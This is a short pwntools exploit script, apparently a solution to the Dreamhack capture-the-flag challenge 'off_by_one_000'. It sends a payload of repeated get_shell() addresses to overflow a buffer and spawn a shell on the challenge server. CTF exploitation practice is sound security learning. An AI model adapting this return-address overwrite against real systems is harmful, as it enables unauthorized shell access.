from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/off_by_one_000')
else:
    r = remote('host1.dreamhack.games', 15259)

get_shell = 0x80485db # get_shell()

payload = p32(get_shell) * 0x40

r.sendafter('Name: ', payload)

r.interactive()